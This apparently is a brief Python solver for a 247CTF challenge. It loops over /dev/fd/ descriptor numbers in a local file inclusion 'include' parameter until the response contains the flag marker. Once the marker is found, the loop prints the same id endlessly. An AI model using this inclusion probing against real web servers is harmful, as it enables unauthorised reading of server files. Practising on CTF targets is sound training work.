#!/usr/bin/python3

import requests
id = 1
while True:
    url = f"https://f9a6c19bf8130c90.247ctf.com:443/?include=/dev/fd/{id}"
    x = requests.get(url)
    if "247CTF" in x.text:
        print(id)
    else:
        id+=1
        

